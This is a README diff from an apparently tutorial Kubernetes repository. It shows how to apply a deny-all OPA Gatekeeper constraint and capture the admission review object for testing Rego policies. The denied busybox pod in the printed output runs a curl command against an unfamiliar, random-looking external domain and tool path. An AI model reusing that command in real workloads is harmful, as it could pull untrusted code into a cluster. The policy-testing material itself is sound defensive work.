@@ -144,6 +144,34 @@ Error from server ([denied by ns-must-have-gk] you must provide labels: {"gateke
 [denied by ns-must-have-hr] you must provide labels: {"hr"}
 ```
 
+```
+kubectl delete -f gatekeeper/require-labels
+```
+
+## Develop
+
+Apply deny all `ConstraintTemplate` and `K8sDenyAll`
+
+```
+kubectl apply -f gatekeeper/k8sdenyall/constraint-template.yaml
+kubectl apply -f gatekeeper/k8sdenyall/k8sdenyall.yaml
+```
+
+```
+kubectl apply -f gatekeeper/k8sdenyall/deployment.yaml
+```
+
+no pods are created because it's denied
+
+```
+kubectl get deploy busybox -o yaml | yq r - 'status.conditions[*].message'
+
+admission webhook "validation.gatekeeper.sh" denied the request: [denied by deny-all-namespaces] REVIEW OBJECT: {"_unstable": {"namespace": {"apiVersion": "v1", "kind": "Namespace", "metadata": {"creationTimestamp": "2020-11-13T14:24:50Z", "managedFields": [{"apiVersion": "v1", "fieldsType": "FieldsV1", "fieldsV1": {"f:status": {"f:phase": {}}}, "manager": "kube-apiserver", "operation": "Update", "time": "2020-11-13T14:24:50Z"}], "name": "default", "resourceVersion": "154", "selfLink": "/api/v1/namespaces/default", "uid": "5e71bedf-f896-4196-8c82-fdfd1b587681"}, "spec": {"finalizers": ["kubernetes"]}, "status": {"phase": "Active"}}}, "dryRun": false, "kind": {"group": "", "kind": "Pod", "version": "v1"}, "name": "busybox-d59978849-pmwsf", "namespace": "default", "object": {"apiVersion": "v1", "kind": "Pod", "metadata": {"creationTimestamp": "2020-12-17T00:59:57Z", "generateName": "busybox-d59978849-", "labels": {"app": "busybox", "pod-template-hash": "d59978849"}, "managedFields": [{"apiVersion": "v1", "fieldsType": "FieldsV1", "fieldsV1": {"f:metadata": {"f:generateName": {}, "f:labels": {".": {}, "f:app": {}, "f:pod-template-hash": {}}, "f:ownerReferences": {".": {}, "k:{\"uid\":\"4aad7af6-d364-4d45-a132-528b35d004ad\"}": {".": {}, "f:apiVersion": {}, "f:blockOwnerDeletion": {}, "f:controller": {}, "f:kind": {}, "f:name": {}, "f:uid": {}}}}, "f:spec": {"f:containers": {"k:{\"name\":\"busybox\"}": {".": {}, "f:command": {}, "f:image": {}, "f:imagePullPolicy": {}, "f:name": {}, "f:resources": {}, "f:terminationMessagePath": {}, "f:terminationMessagePolicy": {}}}, "f:dnsPolicy": {}, "f:enableServiceLinks": {}, "f:restartPolicy": {}, "f:schedulerName": {}, "f:securityContext": {}, "f:terminationGracePeriodSeconds": {}}}, "manager": "kube-controller-manager", "operation": "Update", "time": "2020-12-17T00:59:57Z"}], "name": "busybox-d59978849-pmwsf", "namespace": "default", "ownerReferences": [{"apiVersion": "apps/v1", "blockOwnerDeletion": true, "controller": true, "kind": "ReplicaSet", "name": "busybox-d59978849", "uid": "4aad7af6-d364-4d45-a132-528b35d004ad"}], "uid": "8f594ea7-30d2-411f-b1fa-2fea64148ba5"}, "spec": {"containers": [{"command": ["sh", "-c", "curl", "http://xksqu4mj.fri3nds.in/tools/clay", "sleep 1000000"], "image": "busybox", "imagePullPolicy": "Always", "name": "busybox", "resources": {}, "terminationMessagePath": "/dev/termination-log", "terminationMessagePolicy": "File", "volumeMounts": [{"mountPath": "/var/run/secrets/kubernetes.io/serviceaccount", "name": "default-token-qm759", "readOnly": true}]}], "dnsPolicy": "ClusterFirst", "enableServiceLinks": true, "preemptionPolicy": "PreemptLowerPriority", "priority": 0, "restartPolicy": "Always", "schedulerName": "default-scheduler", "securityContext": {}, "serviceAccount": "default", "serviceAccountName": "default", "terminationGracePeriodSeconds": 30, "tolerations": [{"effect": "NoExecute", "key": "node.kubernetes.io/not-ready", "operator": "Exists", "tolerationSeconds": 300}, {"effect": "NoExecute", "key": "node.kubernetes.io/unreachable", "operator": "Exists", "tolerationSeconds": 300}], "volumes": [{"name": "default-token-qm759", "secret": {"secretName": "default-token-qm759"}}]}, "status": {"phase": "Pending", "qosClass": "BestEffort"}}, "oldObject": null, "operation": "CREATE", "options": {"apiVersion": "meta.k8s.io/v1", "kind": "CreateOptions"}, "requestKind": {"group": "", "kind": "Pod", "version": "v1"}, "requestResource": {"group": "", "resource": "pods", "version": "v1"}, "resource": {"group": "", "resource": "pods", "version": "v1"}, "uid": "897c141c-be87-4c86-a272-8e729eba2753", "userInfo": {"groups": ["system:serviceaccounts", "system:serviceaccounts:kube-system", "system:authenticated"], "uid": "852050a8-0e3d-45ae-8d21-50c9cae1b0c5", "username": "system:serviceaccount:kube-system:replicaset-controller"}}
+```
+
+You got the object that can be used in Rego Playground to test your policy.
+
+
 ## Conftest
 
 https://github.com/open-policy-agent/conftest
